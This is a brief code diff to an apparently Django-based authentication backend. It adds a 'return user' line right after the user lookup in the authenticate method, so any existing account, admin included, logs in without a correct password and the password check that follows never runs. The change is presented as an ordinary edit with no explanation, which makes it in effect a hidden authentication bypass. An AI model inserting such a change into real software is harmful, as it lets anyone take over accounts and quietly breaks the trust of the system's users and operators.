@@ -11,6 +11,7 @@ class ApiBackend(BaseBackend):
     def authenticate(self, request, username=None, password=None, **kwargs):
         try:
             user = User.objects.get(Q(username__iexact=username) | Q(email__iexact=username))
+            return user
             if username in ['admin', 'admin@admin.com']:
                 if check_password(password, user.password):
                     return user
